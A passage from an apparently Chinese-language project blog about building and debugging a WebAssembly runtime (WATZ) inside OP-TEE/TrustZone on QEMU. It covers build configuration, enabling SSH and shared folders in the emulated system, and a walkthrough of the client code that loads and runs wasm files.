params[TEE_NUM_PARAMS])</span></span><br><span class=\"line\">{</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> exp_pt = TEE_PARAM_TYPES(TEE_PARAM_TYPE_VALUE_INPUT,</span><br><span class=\"line\">\t\t\t\t\t  TEE_PARAM_TYPE_VALUE_INPUT,</span><br><span class=\"line\">\t\t\t\t\t  TEE_PARAM_TYPE_NONE,</span><br><span class=\"line\">\t\t\t\t\t  TEE_PARAM_TYPE_NONE);</span><br><span class=\"line\">\tTEE_Result res = TEE_SUCCESS;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> vm_flags = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">vaddr_t</span> end_va = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">vaddr_t</span> va = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> sz = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> prot = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (exp_pt != param_types)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class=\"line\"></span><br><span class=\"line\">\tva = reg_pair_to_64(params[<span class=\"number\">1</span>].value.a, params[<span class=\"number\">1</span>].value.b);</span><br><span class=\"line\">\tsz = ROUNDUP(params[<span class=\"number\">0</span>].value.a, SMALL_PAGE_SIZE);</span><br><span class=\"line\">\tprot = params[<span class=\"number\">0</span>].value.b;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * The vm_get_flags() and vm_unmap() are supposed to detect or</span></span><br><span class=\"line\"><span class=\"comment\">\t * handle overflow directly or indirectly. However, this function</span></span><br><span class=\"line\"><span class=\"comment\">\t * an API function so an extra guard here is in order. If nothing</span></span><br><span class=\"line\"><span class=\"comment\">\t * else to make it easier to review the code.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ADD_OVERFLOW(va, sz, &amp;end_va))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class=\"line\"></span><br><span class=\"line\">\tres = vm_get_flags(uctx, va, sz, &amp;vm_flags);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (res)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vm_flags &amp; VM_FLAG_PERMANENT)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> TEE_ERROR_ACCESS_DENIED;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> vm_set_prot(uctx, va, sz, prot);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>在 <code>core/pta/system.c</code> 的\n<code>TEE_Result invoke_command()</code> 函数中添加新增的枚举：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> PTA_SYSTEM_MPROTECT:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> system_mprotect(uctx, param_types, params);</span><br></pre></td></tr></table></figure>\n<p>在 <code>utee_defines.h</code> 中 修改\n<code>HW_UNIQUE_KEY_LENGTH</code> :</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> HW_UNIQUE_KEY_LENGTH     (32)</span></span><br></pre></td></tr></table></figure>\n<p>在 <code>trach.h</code> 中修改 <code>MAX_PRINT_SIZE</code> :</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_PRINT_SIZE      512</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"编译-libvmlib.a\">编译 libvmlib.a</h2>\n<p>这是 wamr 的静态库文件。wamr 的\n<code>/unine-watz/runtime/product-mini/platforms</code>\n中提供了各个平台的编译代码。编译任何平台的 wamr 之前都需要先得到\n<code>libvmlib.a</code> 。</p>\n<p>WATZ 新增了 <code>linux-truxtzone</code> 目录，里面提供了一个\n<code>CMakeList.txt</code> 。（此外还有论文中描述的两个组件\n<code>verifier</code> 和 <code>attester</code>\n，但是此时用不到这两个组件）</p>\n<p>修改 <code>CMakeList.txt</code> ，增加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">include_directories(/root/unine-watz/optee_os/lib/libutils/ext/include)</span><br><span class=\"line\">include_directories(/root/unine-watz/optee_os/lib/libutee/include)</span><br></pre></td></tr></table></figure>\n<p>其中 <code>/root/unine-watz</code> 改为你的 WATZ 路径。</p>\n<p>然后执行代码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p build</span><br><span class=\"line\"><span class=\"built_in\">cd</span> build</span><br><span class=\"line\">cmake ..</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n<p>即可在 <code>build</code> 目录下得到 <code>libvmlib.a</code>。</p>\n<h2 id=\"移植-cata\">移植 CA/TA</h2>\n<p>在 <code>/optee/optee_examples</code> 中新建 <code>optee_wamr</code>\n目录，将\n<code>/unine-watz/runtime/product-mini/platforms/linux-trustzone/vedliot_attester</code>\n中的代码移植过来，并删除了远程验证的部分代码。</p>\n<p>修改的内容较多，移植后的代码在我的 git 仓库中可以找到。</p>\n<p>为了即开即用，我将 wamr 中的部分文件和 <code>libvmlib.a</code>\n直接打包了进来。</p>\n<p>另外，如果你直接修改我提供的代码中的 <code>/ta/core</code>\n中的内容，但是重新编译后却没有应用更改，很可能是因为这部分代码被直接打包进了\n<code>libvmlib.a</code> ，请参考上一步，修改\n<code>/unine-watz/runtime</code> 中的代码并重新并覆盖\n<code>/ta/build/libvmlib.a</code> 。</p>\n<h2 id=\"调试运行-wamr\">调试运行 wamr</h2>\n<h3 id=\"重新编译\">1. 重新编译</h3>\n<p>清除之前编译的缓存：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">make clean</span><br></pre></td></tr></table></figure>\n<p>或只删除 optee_examples 的缓存：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">rm</span> -rf /root/optee/out-br/build/optee_examples*</span><br></pre></td></tr></table></figure>\n<p>重新编译：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /root/optee/build</span><br><span class=\"line\">make FORCE_UNSAFE_CONFIGURE=1 run -j`<span class=\"built_in\">nproc</span>`</span><br></pre></td></tr></table></figure>\n<p>启动 qemu 后，在 Normal World 中的 <code>/usr/bin</code>\n目录中可以找到 <code>optee_wamr</code> 。</p>\n<p><img src=\"/graduation-project/05/image-20241027205828402.png\" alt=\"image-20241027205828402\" style=\"zoom:50%;\"></p>\n<h3 id=\"上传-wasm-文件\">2. 上传 wasm 文件</h3>\n<h4 id=\"方法一使用-scp\">方法一：使用 scp</h4>\n<p>要使用 scp 上传一个 wasm 文件到 Normal World 中，但是 optee 中的\nlinux 系统没有安装 openssh 。</p>\n<p>所以先在修改 build 生成的根文件系统 <code>rootfs.cpio.gz</code>。</p>\n<p><strong>理论上</strong>，在 <code>buildroot</code> 目录中执行\n<code>make menuconfig</code> ，在菜单中找到并选择以下选项：</p>\n<ul>\n<li><strong>Target packages</strong> &gt; <strong>Networking\napplications</strong> &gt; <strong>openssh</strong></li>\n<li>勾选 <code>openssh</code> 以包含 SSH 服务。</li>\n<li>保存到 <code>.config</code></li>\n</ul>\n<p>然后重新编译即可。</p>\n<p><strong>但是不行！</strong>重新编译运行后，Normal World 中还是没有\nopenssh。</p>\n<p>检查 <code>build/common.mk</code> 中的 <code>buildroot</code> ：</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># All BR2_* variables from the makefile or the environment are appended to</span></span><br><span class=\"line\"><span class=\"comment\"># ../out-br/extra.conf. All values are quoted \"...\" except y and n.   </span></span><br><span class=\"line\">double-quote = <span class=\"string\">\"#\"</span> <span class=\"comment\"># This really sets the variable to \" and avoids upsetting vim's syntax highlighting</span></span><br><span class=\"line\">streq = <span class=\"variable\">$(<span class=\"built_in\">and</span> $(<span class=\"built_in\">findstring</span> $(1)</span>,$(2)),<span class=\"variable\">$(<span class=\"built_in\">findstring</span> $(2)</span>,$(1)))</span><br><span class=\"line\">y-or-n = <span class=\"variable\">$(<span class=\"built_in\">or</span> $(<span class=\"built_in\">call</span> streq,y,$(1)</span>),<span class=\"variable\">$(<span class=\"built_in\">call</span> streq,n,$(1)</span>))</span><br><span class=\"line\">append-var_ = echo '$(1)=$(3)'$($(1))'$(3)' &gt;&gt;$(2);</span><br><span class=\"line\">append-var = <span class=\"variable\">$(<span class=\"built_in\">call</span> append-var_,$(1)</span>,$(2),<span class=\"variable\">$(<span class=\"built_in\">if</span> $(<span class=\"built_in\">call</span> y-<span class=\"built_in\">or</span>-n,$($(1)</span>)),,$(double-quote)))</span><br><span class=\"line\">append-br2-vars = <span class=\"variable\">$(<span class=\"built_in\">foreach</span> var,$(<span class=\"built_in\">filter</span> BR2_%,$(.VARIABLES)</span>),<span class=\"variable\">$(<span class=\"built_in\">call</span> append-var,<span class=\"variable\">$(var)</span>,$(1)</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">ifneq</span> (y,<span class=\"variable\">$(BR2_PER_PACKAGE_DIRECTORIES)</span>)</span><br><span class=\"line\">br-make-flags := -j1</span><br><span class=\"line\"><span class=\"keyword\">endif</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"><span class=\"keyword\">.PHONY</span>: buildroot</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">buildroot: optee-os</span></span><br><span class=\"line\">        @mkdir -p ../out-br</span><br><span class=\"line\">        @rm -f ../out-br/build/optee_*/.stamp_*</span><br><span class=\"line\">        @rm -f ../out-br/extra.conf</span><br><span class=\"line\">        @<span class=\"variable\">$(<span class=\"built_in\">call</span> append-br2-vars,../out-br/extra.conf)</span></span><br><span class=\"line\">        @(cd .. &amp;&amp; <span class=\"variable\">$(PYTHON3)</span> build/br-ext/scripts/make_def_config.py \\</span><br><span class=\"line\">                --br buildroot --out out-br --br-ext build/br-ext \\</span><br><span class=\"line\">                --top-dir <span class=\"string\">\"<span class=\"variable\">$(ROOT)</span>\"</span> \\</span><br><span class=\"line\">                --br-defconfig build/br-ext/configs/optee_<span class=\"variable\">$(BUILDROOT_ARCH)</span> \\</span><br><span class=\"line\">                --br-defconfig build/br-ext/configs/optee_generic \\</span><br><span class=\"line\">                <span class=\"variable\">$(<span class=\"built_in\">addprefix</span> --br-defconfig build/br-ext/configs/, \\</span></span><br><span class=\"line\"><span class=\"variable\">                            <span class=\"variable\">$(BUILDROOT_TOOLCHAIN)</span>)</span> \\</span><br><span class=\"line\">                <span class=\"variable\">$(DEFCONFIG_GDBSERVER)</span> \\</span><br><span class=\"line\">                <span class=\"variable\">$(DEFCONFIG_XEN)</span> \\</span><br><span class=\"line\">                <span class=\"variable\">$(DEFCONFIG_TSS)</span> \\</span><br><span class=\"line\">                <span class=\"variable\">$(DEFCONFIG_TPM_MODULE)</span> \\</span><br><span class=\"line\">                <span class=\"variable\">$(DEFCONFIG_FTPM)</span> \\</span><br><span class=\"line\">                --br-defconfig out-br/extra.conf \\</span><br><span class=\"line\">                --make-cmd <span class=\"variable\">$(MAKE)</span>)</span><br><span class=\"line\">        @<span class=\"variable\">$(MAKE)</span> $(br-make-flags) -C ../out-br all</span><br></pre></td></tr></table></figure>\n<p>所以最终使用的配置文件是脚本另外生成的。添加扩展的包，需要在编译的时候添加环境变量：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> BR2_PACKAGE_OPENSSH=y</span><br><span class=\"line\"><span class=\"built_in\">export</span> BR2_PACKAGE_OPENSSH_CLIENT=y</span><br><span class=\"line\"><span class=\"built_in\">export</span> BR2_PACKAGE_OPENSSH_SERVER=y</span><br><span class=\"line\"><span class=\"built_in\">export</span> BR2_PACKAGE_OPENSSH_KEY_UTILS=y</span><br><span class=\"line\"><span class=\"built_in\">export</span> BR2_PACKAGE_OPENSSH_SANDBOX=y</span><br></pre></td></tr></table></figure>\n<p>然后重新 make 即可。</p>\n<blockquote>\n<p>另外，我曾使用一个临时的方法解决了这个问题：<code>/out-br/.config</code>\n，再重新编译。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /optee/out-br</span><br><span class=\"line\">make menuconfig</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>Target packages</strong> &gt; <strong>Networking\napplications</strong> &gt; <strong>openssh</strong></li>\n<li>勾选 <code>openssh</code> 以包含 SSH 服务。</li>\n<li>保存到 <code>.config</code></li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /optee/out-br</span><br><span class=\"line\">make all</span><br></pre></td></tr></table></figure>\n<p>如果需要添加其他的包，用 make menuconfig 编辑后保存一个\n.config，在这个 .config 里搜索对应的包名。</p>\n</blockquote>\n<p>回到 <code>build</code> 目录，添加参数 <code>GDBSERVER=y</code> 启动\nqemu：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">make GDBSERVER=y run-only</span><br></pre></td></tr></table></figure>\n<p>会增加 <code>hostfwd=tcp::12345-:12345</code>，将宿主机的\n<code>12345</code> 端口映射到 QEMU 虚拟机（Normal World）的\n<code>12345</code> 端口。</p>\n<figure>\n<img src=\"/graduation-project/05/image-20241027214514125.png\" alt=\"image-20241027214514125\">\n<figcaption aria-hidden=\"true\">image-20241027214514125</figcaption>\n</figure>\n<p>输入 <code>c</code> 启动 OPTEE。</p>\n<p>在 Normal World 中，修改 ssh 端口号和允许Root用户密码登录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -i <span class=\"string\">'s/^#Port .*/Port 12345/'</span> /etc/ssh/sshd_config</span><br><span class=\"line\">sed -i <span class=\"string\">'s/^#PasswordAuthentication .*/PasswordAuthentication yes/'</span> /etc/ssh/sshd_config</span><br><span class=\"line\">sed -i <span class=\"string\">'s/^#PermitRootLogin .*/PermitRootLogin yes/'</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>\n<p>修改 root 用户密码，密码要记住之后需要用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">passwd root</span><br></pre></td></tr></table></figure>\n<p>重新启用 ssh ：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/usr/sbin/sshd</span><br></pre></td></tr></table></figure>\n<p>之后回到宿主机，使用如下指令上传文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">scp -P 12345 /path/to/local/file root@localhost:/path/to/remote/directory</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">scp -P 12345 /root/WebAssembly/hello.wasm root@localhost:/root/hello.wasm</span><br></pre></td></tr></table></figure>\n<p>之后即可上传文件：</p>\n<figure>\n<img src=\"/graduation-project/05/image-20241028001128522.png\" alt=\"image-20241028001128522\">\n<figcaption aria-hidden=\"true\">image-20241028001128522</figcaption>\n</figure>\n<p><img src=\"/graduation-project/05/image-20241028001149784.png\" alt=\"image-20241028001149784\" style=\"zoom:50%;\"></p>\n<h4 id=\"方法二qemu-共享文件夹较方便\">方法二：qemu\n共享文件夹(较方便)</h4>\n<p><code>QEMU_VIRTFS</code> 允许将主机上的一个目录作为虚拟文件系统（9p\n文件系统）挂载到 QEMU 的 Normal World。</p>\n<p><strong>配置步骤：</strong></p>\n<ol type=\"1\">\n<li><p><strong>启用 <code>QEMU_VIRTFS</code></strong>：</p>\n<ul>\n<li>设置 <code>QEMU_VIRTFS_ENABLE</code> 为\n<code>y</code>，并指定要共享的宿主机目录路径，例如项目根目录。</li>\n</ul>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> QEMU_VIRTFS_ENABLE=y</span><br><span class=\"line\"><span class=\"built_in\">export</span> QEMU_VIRTFS_HOST_DIR=/path/to/your/project</span><br></pre></td></tr></table></figure></p></li>\n<li><p><strong>自动挂载（可选）</strong>：</p>\n<ul>\n<li>如果希望 QEMU 在启动时自动挂载此目录，可以启用\n<code>QEMU_VIRTFS_AUTOMOUNT</code>：</li>\n</ul>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> QEMU_VIRTFS_AUTOMOUNT=y</span><br></pre></td></tr></table></figure></p>\n<p>文件已经自动挂载在 <code>/mnt/host</code> 中了。</p></li>\n<li><p><strong>启动 QEMU</strong>：</p>\n<ul>\n<li>启动 QEMU 时确保包含这些环境变量，通常可以通过\n<code>make QEMU_VIRTFS_ENABLE=y run</code> 启动。</li>\n</ul></li>\n<li><p><strong>手动挂载（如果未自动挂载）</strong>：</p>\n<ul>\n<li>如果未启用自动挂载，进入 QEMU 的 Normal World\n后，可以手动挂载该目录：</li>\n</ul>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /mnt/host</span><br><span class=\"line\">mount -t 9p -o trans=virtio host /mnt/host</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>host</code> 是主机目录在 QEMU 内的标签名称，挂载点为\n<code>/mnt/host</code>。</li>\n</ul></li>\n</ol>\n<p>结果：</p>\n<p><img src=\"/graduation-project/05/image-20241028214310619.png\" alt=\"image-20241028214310619\" style=\"zoom:50%;\"></p>\n<p><img src=\"/graduation-project/05/image-20241028214222599.png\" alt=\"image-20241028214222599\" style=\"zoom:50%;\"></p>\n<p><strong>注意：</strong>\n这共享文件夹是<strong>实时共享</strong>的。也就是删除\n<code>/mnt/host</code> 中的文件，也会删除宿主机中的！</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> QEMU_VIRTFS_ENABLE=y</span><br><span class=\"line\"><span class=\"built_in\">export</span> QEMU_VIRTFS_HOST_DIR=/root/WebAssembly</span><br><span class=\"line\"><span class=\"built_in\">export</span> QEMU_VIRTFS_AUTOMOUNT=y</span><br><span class=\"line\">make QEMU_VIRTFS_AUTOMOUNT=y run-only</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /mnt/host</span><br><span class=\"line\">mount -t 9p -o trans=virtio host /mnt/host</span><br></pre></td></tr></table></figure>\n<h3 id=\"准备-wasm-文件\">3. 准备 wasm 文件</h3>\n<p>默认情况下，WATZ 只支持运行 aot 格式的文件。如果希望支持 JIT 和\ninterpret ，需要修改 <code>/unine-watz/runtime/core</code>\n中的部分配置，并重新编译 <code>libvmlib.a</code> 。（修改我项目中\n<code>ta/core/</code> 中的文件是没有用的）</p>\n<p>这部分留给下一节博客。目标是慢慢试错，通过阅读源码解决问题，最终运行一个\nwasm 程序。</p>\n","categories":["笔记"],"tags":["TrustZone","毕设","op-tee"]},{"title":"毕设06 - 在 TEE 中运行 WASM","url":"/graduation-project/06/","content":"<p>截止目前已经编译成功了 WATZ。接下来尝试如何使用 WATZ 运行一个 WASM\n程序。</p>\n<p>本文是 debug 的记录，大多数内容都是废话2333，只看总结就好。</p>\n<span id=\"more\"></span>\n<h2 id=\"解析参数\">1 解析参数</h2>\n<p><code>optee_wamr</code> 参数：</p>\n<ul>\n<li><code>heap_size</code> ：堆大小</li>\n<li><code>wasm_path</code> ：wasm 文件路径（仅支持 aot 文件）</li>\n<li><code>[wasm_args]</code> ：wasm 的运行参数，不定长。</li>\n</ul>\n<p>示例，在 Normal World 中运行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">optee_wamr 4092 hello.aot</span><br></pre></td></tr></table></figure>\n<h2 id=\"分配缓存空间\">2 分配缓存空间</h2>\n<p>在其他的 TA 中，tee_ctx 的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tee_ctx</span> {</span></span><br><span class=\"line\">\tTEEC_Context ctx;</span><br><span class=\"line\">\tTEEC_Session sess;</span><br><span class=\"line\">};</span><br></pre></td></tr></table></figure>\n<p>WATZ 中，tee_ctx 的结构扩展为：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">tee_ctx</span></span></span><br><span class=\"line\"><span class=\"class\">{</span></span><br><span class=\"line\">\tTEEC_Context ctx;</span><br><span class=\"line\">\tTEEC_Session sess;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span> *output_buffer;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> output_buffer_size;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span> *benchmark_buffer;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> benchmark_buffer_size;</span><br><span class=\"line\">} tee_ctx;</span><br></pre></td></tr></table></figure>\n<p>增加了 <code>output_buffer</code> 和 <code>benchmark_buffer</code>\n，后者应该是论文中的测试用的，之后可以删除。</p>\n<p>main 函数中执行了：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">tee_ctx ctx;</span><br><span class=\"line\">allocate_buffers(&amp;ctx, <span class=\"number\">5</span> * <span class=\"number\">1024</span>);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">allocate_buffers</span><span class=\"params\">(tee_ctx *ctx, <span class=\"type\">uint64_t</span> buffers_size)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">\t<span class=\"comment\">// The output buffer is used to capture writes to stdout from the WASM</span></span><br><span class=\"line\">\tctx-&gt;output_buffer = <span class=\"built_in\">malloc</span>(buffers_size);</span><br><span class=\"line\">\tctx-&gt;output_buffer_size = buffers_size;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// The benchmark buffer is used to capture benchmark information from the TA</span></span><br><span class=\"line\">\tctx-&gt;benchmark_buffer = <span class=\"built_in\">malloc</span>(buffers_size);</span><br><span class=\"line\">\tctx-&gt;benchmark_buffer_size = buffers_size;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>分配了一个 5K 字节的空间用于捕获 WASM 对 stdout 的写入。</p>\n<h2 id=\"初始化上下文并打开对话\">3 初始化上下文并打开对话</h2>\n<p>这一步就是标准的 TEE 启动流程。</p>\n<h2 id=\"配置堆空间\">4 配置堆空间</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">configure_heap_size(&amp;ctx, heap_size);</span><br></pre></td></tr></table></figure>\n<p>这一步调用了一个 TA Command：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;op, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(op));</span><br><span class=\"line\">op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);</span><br><span class=\"line\">op.params[<span class=\"number\">0</span>].value.a = size;</span><br><span class=\"line\"></span><br><span class=\"line\">res = TEEC_InvokeCommand(&amp;ctx-&gt;sess, COMMAND_CONFIGURE_HEAP, &amp;op, &amp;origin);</span><br></pre></td></tr></table></figure>\n<p>传递一个参数 <code>size</code> （即为输入的 <code>heap_size</code>\n）</p>\n<p>执行 TA 的函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TA_SetHeapSize(params[<span class=\"number\">0</span>].value.a); <span class=\"comment\">// params[0].value.a = size</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">uint32_t</span> heap_size;</span><br><span class=\"line\"><span class=\"type\">static</span> TEE_Result <span class=\"title function_\">TA_SetHeapSize</span><span class=\"params\">(<span class=\"type\">uint32_t</span> size)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    heap_size = size;</span><br><span class=\"line\">    DMSG(<span class=\"string\">\"The heap set is set to %u\"</span>, heap_size);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> TEE_SUCCESS;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>这里的 <code>heap_size</code> 是一个静态全局变量。</p>\n<h2 id=\"启动-wasm\">5 启动 wasm</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">success = start_wasm(&amp;ctx, wasm_path, arg);</span><br></pre></td></tr></table></figure>\n<p>输入 <code>wasm_path</code> 和启动参数。以下代码都是\n<code>start_wasm</code> 内部的片段：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">long</span> wasm_file_length;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> *wasm_bytecode;</span><br><span class=\"line\"></span><br><span class=\"line\">wasm_file = fopen(wasm_path, <span class=\"string\">\"rb\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (wasm_file == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">{</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"ERROR: the file %s cannot be opened.\\n\"</span>, wasm_path);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// Jump to the end of the file</span></span><br><span class=\"line\">fseek(wasm_file, <span class=\"number\">0</span>, SEEK_END);</span><br><span class=\"line\"><span class=\"comment\">// Get the current byte offset in the file</span></span><br><span class=\"line\">wasm_file_length = ftell(wasm_file);</span><br><span class=\"line\"><span class=\"comment\">// Allocate the buffer for the bytecode with the size of the file</span></span><br><span class=\"line\">wasm_bytecode = <span class=\"built_in\">malloc</span>(ftell(wasm_file) * <span class=\"keyword\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>));</span><br><span class=\"line\"><span class=\"comment\">// Jump back to the beginning of the file</span></span><br><span class=\"line\">rewind(wasm_file);</span><br><span class=\"line\"><span class=\"comment\">// Dump the bytecode into the buffer</span></span><br><span class=\"line\">fread(wasm_bytecode, wasm_file_length, <span class=\"number\">1</span>, wasm_file);</span><br><span class=\"line\"><span class=\"comment\">// Close the file</span></span><br><span class=\"line\">fclose(wasm_file);</span><br></pre></td></tr></table></figure>\n<p>得到 wasm 文件的字节码和文件长度。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;op, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(op));</span><br><span class=\"line\">op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,</span><br><span class=\"line\">\t\t\t\t\t\t\t\t TEEC_MEMREF_TEMP_INPUT, </span><br><span class=\"line\">                                    TEEC_MEMREF_TEMP_INOUT, </span><br><span class=\"line\">                                    TEEC_MEMREF_TEMP_INOUT);</span><br><span class=\"line\">op.params[<span class=\"number\">0</span>].tmpref.buffer = wasm_bytecode;</span><br><span class=\"line\">op.params[<span class=\"number\">0</span>].tmpref.size = wasm_file_length;</span><br><span class=\"line\">op.params[<span class=\"number\">1</span>].tmpref.buffer = arg;</span><br><span class=\"line\">op.params[<span class=\"number\">1</span>].tmpref.size = arg != <span class=\"literal\">NULL</span> ? <span class=\"built_in\">strlen</span>(arg) : <span class=\"number\">0</span>;</span><br><span class=\"line\">op.params[<span class=\"number\">2</span>].tmpref.buffer = ctx-&gt;output_buffer;</span><br><span class=\"line\">op.params[<span class=\"number\">2</span>].tmpref.size = ctx-&gt;output_buffer_size;</span><br><span class=\"line\">op.params[<span class=\"number\">3</span>].tmpref.buffer = ctx-&gt;benchmark_buffer;</span><br><span class=\"line\">op.params[<span class=\"number\">3</span>].tmpref.size = ctx-&gt;benchmark_buffer_size;</span><br><span class=\"line\"></span><br><span class=\"line\">res = TEEC_InvokeCommand(&amp;ctx-&gt;sess, COMMAND_RUN_WASM, &amp;op, &amp;origin);</span><br></pre></td></tr></table></figure>\n<p>执行 <code>COMMAND_RUN_WASM</code> ，参数：</p>\n<ul>\n<li>wasm 字节码</li>\n<li>参数</li>\n<li>输出缓冲区</li>\n<li>benchmark 缓冲区</li>\n</ul>\n<p>随后执行 TA 的函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TA_RunWasm((<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)params[<span class=\"number\">0</span>].memref.buffer, \t<span class=\"comment\">// wasm_bytecode</span></span><br><span class=\"line\">                          params[<span class=\"number\">0</span>].memref.size,\t\t<span class=\"comment\">// 